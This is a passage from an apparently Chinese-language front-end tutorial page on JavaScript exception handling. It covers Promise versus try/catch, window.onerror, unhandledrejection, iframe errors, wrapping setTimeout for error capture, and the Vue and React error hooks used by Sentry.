  <span class="token keyword">const</span> num1 <span class="token operator">=</span> <span class="token keyword">yield</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>num1<span class="token punctuation">)</span> <span class="token comment">// 2</span>
  <span class="token keyword">const</span> num2 <span class="token operator">=</span> <span class="token keyword">yield</span> <span class="token function">fn</span><span class="token punctuation">(</span>num1<span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>num2<span class="token punctuation">)</span> <span class="token comment">// 4</span>
  <span class="token keyword">const</span> num3 <span class="token operator">=</span> <span class="token keyword">yield</span> <span class="token function">fn</span><span class="token punctuation">(</span>num2<span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>num3<span class="token punctuation">)</span> <span class="token comment">// 8</span>
  <span class="token keyword">return</span> num3
<span class="token punctuation">}</span>

<span class="token keyword">const</span> genToAsync <span class="token operator">=</span> <span class="token function">generatorToAsync</span><span class="token punctuation">(</span>gen<span class="token punctuation">)</span>
<span class="token keyword">const</span> asyncRes <span class="token operator">=</span> <span class="token function">genToAsync</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>asyncRes<span class="token punctuation">)</span> <span class="token comment">// Promise</span>
asyncRes<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 8</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h4 id="_6-异常处理"><a href="#_6-异常处理" class="header-anchor">#</a> 6:异常处理</h4> <h5 id="catch与try-catch与finally"><a href="#catch与try-catch与finally" class="header-anchor">#</a> .catch与Try/catch与finally</h5> <ul><li>Promise      ====&gt; .catch</li> <li>Async/await ====&gt; try/catch; **能被 try catch 捕捉到的异常，必须是在报错的时候，线程执行已经进入 try catch 代码块，且处在 try catch 里面，这个时候才能被捕捉到。**如果是在之前，或者之后，都无法捕捉异常。</li></ul> <p>案例一：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">try</span><span class="token punctuation">{</span>
    <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        a<span class="token punctuation">.</span>b<span class="token punctuation">;</span> <span class="token comment">//**try catch 无法捕捉 Promise  的异常，是因为 Promise 的异常没有往上抛。**</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">v</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">222</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// output</span>
<span class="token number">111</span>
<span class="token number">222</span>
<span class="token function">Uncaught</span> <span class="token punctuation">(</span><span class="token keyword">in</span> promise<span class="token punctuation">)</span> ReferenceError<span class="token operator">:</span> a is not defined
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>案例二：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token comment">// a.b;</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token function">reject</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token comment">// return resolve(3333333)</span>
    <span class="token comment">// return resolve(a.b)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">v</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token comment">// .catch(e =&gt; {</span>
  <span class="token comment">//   console.log('error1',e);</span>
  <span class="token comment">// })</span>
<span class="token punctuation">}</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token parameter">params</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">try</span> <span class="token punctuation">{</span>
    <span class="token keyword">await</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'error2'</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">//output</span>
<span class="token comment">// error2 1</span>
<span class="token comment">// 111</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br></div></div><h5 id="异常捕获原理【核心】"><a href="#异常捕获原理【核心】" class="header-anchor">#</a> 异常捕获原理【核心】</h5> <h6 id="监控方式分类"><a href="#监控方式分类" class="header-anchor">#</a> 监控方式分类</h6> <p>前端捕获异常分为全局捕获和单点捕获。</p> <ul><li><strong>全局捕获</strong>：代码集中，易于管理；</li> <li><strong>单点捕获</strong>：作为补充，对某些特殊情况进行捕获，但分散，不利于管理。</li></ul> <h6 id="全局捕获"><a href="#全局捕获" class="header-anchor">#</a> 全局捕获</h6> <ul><li><p>通过全局的接口，将捕获代码集中写在一个地方，可以利用的接口有：</p> <ul><li><code>window.addEventListener(‘error’) / window.addEventListener(“unhandledrejection”) / document.addEventListener(‘click’)</code> 等</li></ul></li> <li><p>框架级别的全局监听；</p> <ul><li>例如<code>aixos</code>中使用<code>interceptor</code>进行拦截，</li> <li><code>vue、react</code>都有自己的错误采集接口</li></ul></li> <li><p>通过对全局函数进行封装包裹，实现在在调用该函数时自动捕获异常</p></li> <li><p>对实例方法重写（Patch），在原有功能基础上包裹一层，</p> <p>例如对<code>setTimeout</code>进行重写，在使用方法不变的情况下也可以异常捕获</p></li></ul> <h6 id="单点捕获"><a href="#单点捕获" class="header-anchor">#</a> 单点捕获</h6> <ul><li>在业务代码中对单个代码块进行包裹，或在逻辑流程中打点，实现有针对性的异常捕获：</li> <li><code>try…catch</code></li> <li>专门写一个函数来收集异常信息，在异常发生时，调用该函数</li> <li>专门写一个函数来包裹其他函数，得到一个新函数，该新函数运行结果和原函数一模一样，只是在发生异常时可以捕获异常</li></ul> <h6 id="window-onerror-异常处理"><a href="#window-onerror-异常处理" class="header-anchor">#</a> window.onerror 异常处理</h6> <p>window.onerror 无论是异步还是非异步错误，onerror 都能捕获到运行时错误。</p> <p>监控JavaScript运行时错误（包括语法错误）和 资源加载错误；</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>window<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">message<span class="token punctuation">,</span> source<span class="token punctuation">,</span> lineno<span class="token punctuation">,</span> colno<span class="token punctuation">,</span> error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">...</span> <span class="token punctuation">}</span>
window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">...</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span>
<span class="token comment">// 函数参数：</span>
    <span class="token comment">// message：错误信息（字符串）。可用于HTML onerror=&quot;&quot;处理程序中的event。</span>
    <span class="token comment">// source：发生错误的脚本URL（字符串）</span>
    <span class="token comment">// lineno：发生错误的行号（数字）</span>
    <span class="token comment">// colno：发生错误的列号（数字）</span>
    <span class="token comment">// error：Error对象（对象</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code>window<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">msg<span class="token punctuation">,</span> url<span class="token punctuation">,</span> row<span class="token punctuation">,</span> col<span class="token punctuation">,</span> error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'我知道错误了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
        msg<span class="token punctuation">,</span>  url<span class="token punctuation">,</span>  row<span class="token punctuation">,</span> col<span class="token punctuation">,</span> error
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>注意：</p> <ul><li>1）window.onerror 函数只有在返回 true 的时候，异常才不会向上抛出，否则即使是知道异常的发生控制台还是会显示 Uncaught Error: xxxxx。</li> <li>2）window.onerror 是无法捕获到网络异常的错误。由于网络请求异常不会事件冒泡，因此必须在捕获阶段将其捕捉到才行，但是这种方式虽然可以捕捉到网络请求的异常，但是无法判断 HTTP 的状态是 404 还是其他比如 500 。还需要配合服务端日志才进行排查分析才可以。</li> <li>可以看到 JS 错误监控里面有个 window.onEerror，又用了 window.addEventLisenter（'error'），其实两者并不能互相代替。
window.onError 是一个标准的错误捕获接口，<strong>它可以拿到对应的这种 JS 错误</strong>；
window.addEventLisenter（'error'）也可以捕获到错误，但是它拿到的 JS 报错堆栈往往是不完整的。</li> <li><strong>同时 window.onError 无法获取到资源加载失败的一个情况，必须使用 window.addEventLisenter（'error'）来捕获资源加载失败的情况。</strong></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">msg<span class="token punctuation">,</span> url<span class="token punctuation">,</span> row<span class="token punctuation">,</span> col<span class="token punctuation">,</span> error</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'我知道错误了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>
        msg<span class="token punctuation">,</span> url<span class="token punctuation">,</span> row<span class="token punctuation">,</span> col<span class="token punctuation">,</span> error
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h6 id="promise错误"><a href="#promise错误" class="header-anchor">#</a> Promise错误</h6> <p><strong>Promise 实例抛出异常而你没有用 catch 去捕获的话，onerror 或 try-catch 也无能为力，无法捕捉到错误</strong>。 如果用到很多 Promise 实例的话，特别是你在一些基于 promise 的异步库比如 axios 等一定要小心，因为你不知道什么时候这些异步请求会抛出异常而你并没有处理它，<strong>所以你最好添加一个 Promise 全局异常捕获事件 unhandledrejection。</strong></p> <p>``Promise<code>的话主要是</code>unhandledrejection<code>事件，也就是未被</code>catch<code>的</code>reject<code>状态的</code>promise`；</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&quot;unhandledrejection&quot;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'我知道 promise 的错误了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>reason<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&quot;unhandledrejection&quot;</span><span class="token punctuation">,</span> <span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">warn</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">UNHANDLED PROMISE REJECTION: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>event<span class="token punctuation">.</span>reason<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h6 id="iframe错误"><a href="#iframe错误" class="header-anchor">#</a> iframe错误</h6> <p>父窗口直接使用 window.onerror 是无法直接捕获，如果你想要捕获 iframe 的异常的话，有分好几种情况。</p> <p><strong>1） 如果你的 iframe 页面和你的主站是同域名的话，直接给 iframe 添加 onerror 事件即可。</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">&quot;./iframe.html&quot;</span> frameborder<span class="token operator">=</span><span class="token string">&quot;0&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
  window<span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">msg<span class="token punctuation">,</span> url<span class="token punctuation">,</span> row<span class="token punctuation">,</span> col<span class="token punctuation">,</span> error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'我知道 iframe 的错误了，也知道错误信息'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      msg<span class="token punctuation">,</span>  url<span class="token punctuation">,</span>  row<span class="token punctuation">,</span> col<span class="token punctuation">,</span> error
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p><strong>2）如果你嵌入的 iframe 页面和你的主站不是同个域名的，但是 iframe 内容不属于第三方</strong></p> <p><strong>可以通过与 iframe 通信的方式将异常信息抛给主站接收</strong>。与 iframe 通信的方式有很多，常用的如： <a href="https://github.com/happylindz/blog/issues/3" target="_blank" rel="noopener noreferrer">postMessage，hash 或者 name字段跨域等等<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p><strong>3）如果是非同域且网站不受自己控制的话，除了通过控制台看到详细的错误信息外，没办法捕获</strong></p> <h6 id="异步定时相关"><a href="#异步定时相关" class="header-anchor">#</a> 异步定时相关</h6> <p><code>setTimeout、setInterval、requestAnimationFrame</code>等：其实就是通过代理的方式把原来的方法拦截一下在调用真实的方法之前做一些自己的事情;【拦截劫持】</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> prevSetTimeout <span class="token operator">=</span> window<span class="token punctuation">.</span>setTimeout<span class="token punctuation">;</span>

window<span class="token punctuation">.</span><span class="token function-variable function">setTimeout</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">callback<span class="token punctuation">,</span> timeout</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> self <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">prevSetTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
      <span class="token function">callback</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// 捕获到详细的错误，在这里处理日志上报等了逻辑</span>
      <span class="token comment">// ...</span>
      <span class="token keyword">throw</span> e<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> timeout<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h6 id="vue-config-errorhandler"><a href="#vue-config-errorhandler" class="header-anchor">#</a> Vue.config.errorHandler</h6> <p><code>Vue</code>的<code>Vue.config.errorHandler</code>跟上面的同理;</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// sentry中对Vue errorHandler的处理</span>
<span class="token keyword">function</span> <span class="token function">vuePlugin</span><span class="token punctuation">(</span><span class="token parameter">Raven<span class="token punctuation">,</span> Vue</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> _oldOnError <span class="token operator">=</span> Vue<span class="token punctuation">.</span>config<span class="token punctuation">.</span>errorHandler<span class="token punctuation">;</span>
  Vue<span class="token punctuation">.</span>config<span class="token punctuation">.</span><span class="token function-variable function">errorHandler</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">VueErrorHandler</span><span class="token punctuation">(</span><span class="token parameter">error<span class="token punctuation">,</span> vm<span class="token punctuation">,</span> info</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 上报</span>
    Raven<span class="token punctuation">.</span><span class="token function">captureException</span><span class="token punctuation">(</span>error<span class="token punctuation">,</span> <span class="token punctuation">{</span>
      extra<span class="token operator">:</span> metaData
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> _oldOnError <span class="token operator">===</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// 为什么这么做？</span>
      <span class="token function">_oldOnError</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> error<span class="token punctuation">,</span> vm<span class="token punctuation">,</span> info<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
module<span class="token punctuation">.</span>exports <span class="token operator">=</span> vuePlugin<span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><h6 id="react的-errorboundary"><a href="#react的-errorboundary" class="header-anchor">#</a> <code>React</code>的 ErrorBoundary</h6> <p><code>ErrorBoundary</code>的定义：<strong>如果一个<code>class</code>组件中定义了<code>static getDerivedStateFromError()</code>或<code>componentDidCatch()</code>这两个生命周期方法中的任意一个（或两个）时，那么它就变成一个错误边界</strong>。当抛出错误后，请使用<code>static getDerivedStateFromError()</code>渲染备用 UI ，使用<code>componentDidCatch()</code>打印错误信息</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// ErrorBoundary的示例</span>
<span class="token keyword">class</span> <span class="token class-name">ErrorBoundary</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">props</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">{</span> hasError<span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">componentDidCatch</span><span class="token punctuation">(</span><span class="token parameter">error<span class="token punctuation">,</span> info</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> hasError<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 在这里可以做异常的上报</span>
    <span class="token function">logErrorToMyService</span><span class="token punctuation">(</span>error<span class="token punctuation">,</span> info<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>hasError<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>Something went wrong<span class="token punctuation">.</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>children<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token operator">&lt;</span>ErrorBoundary<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>MyWidget <span class="token operator">/</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>ErrorBoundary<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div><p><strong><code>Sentry</code>中react的实现</strong></p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// ts声明的类型，可以看到sentry大概实现的方法</span>
<span class="token comment">/**
 * A ErrorBoundary component that logs errors to Sentry.
 * Requires React &gt;= 16
 */</span>
